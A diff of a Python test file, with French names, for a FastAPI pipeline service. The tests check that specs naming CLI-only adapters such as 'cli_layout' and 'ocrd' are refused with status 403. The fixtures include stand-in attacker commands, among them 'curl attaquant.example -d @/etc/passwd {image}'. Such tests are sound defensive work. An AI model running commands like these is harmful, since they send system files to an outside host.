@@ -16,6 +16,7 @@ import io
 import zipfile
 from pathlib import Path
 
+import pytest
 import yaml
 from fastapi.testclient import TestClient
 
@@ -264,23 +265,27 @@ def test_a_brick_outside_the_role_is_refused(tmp_path: Path) -> None:
 # --------------------------------------------------------------------------- #
 
 
-def _spec_avec_cli() -> str:
+def _spec_avec_brique(nom: str, reglages: dict[str, object]) -> str:
     spec = yaml.safe_load(_spec_minimale())
     spec["pipelines"][0]["steps"].insert(
         0,
         {
             "id": "seg",
             "kind": "segmentation",
-            "adapter_name": "cli_layout:evasion",
+            "adapter_name": f"{nom}:evasion",
             "input_types": ["image"],
             "output_types": ["layout"],
         },
     )
-    spec["adapter_kwargs"]["cli_layout:evasion"] = {
-        "label": "evasion",
-        "command": "curl attaquant.example -d @/etc/passwd {image}",
-    }
+    spec["adapter_kwargs"][f"{nom}:evasion"] = {"label": "evasion", **reglages}
     return yaml.safe_dump(spec, allow_unicode=True)
+
+
+def _spec_avec_cli() -> str:
+    return _spec_avec_brique(
+        "cli_layout",
+        {"command": "curl attaquant.example -d @/etc/passwd {image}"},
+    )
 
 
 def test_une_spec_qui_nomme_une_brique_cli_est_refusee(tmp_path: Path) -> None:
@@ -320,3 +325,31 @@ def test_le_refus_vaut_aussi_sur_une_instance_privee(tmp_path: Path) -> None:
     )
 
     assert reponse.status_code == 403
+
+
+@pytest.mark.parametrize(
+    ("brique", "reglages"),
+    [
+        ("cli_layout", {"command": "curl attaquant.example {image} {out}"}),
+        ("ocrd", {"processor": "ocrd-tesserocr-segment"}),
+    ],
+)
+def test_toute_brique_reservee_a_la_cli_est_refusee(
+    tmp_path: Path, brique: str, reglages: dict[str, object]
+) -> None:
+    """Le refus porte sur la **liste**, pas sur une brique nommée à la main.
+
+    ``ocrd`` a rejoint ``cli_layout`` dans ``CLI_ONLY_KINDS`` : une brique
+    ajoutée à cette liste doit être refusée sans qu'on touche au lanceur.
+    """
+    client = _client(tmp_path)
+    corpus_id = _corpus(client)
+
+    reponse = client.post(
+        "/api/runs/spec",
+        headers=_CSRF,
+        json={"corpus_id": corpus_id, "spec": _spec_avec_brique(brique, reglages)},
+    )
+
+    assert reponse.status_code == 403, reponse.json()
+    assert brique in reponse.json()["detail"]
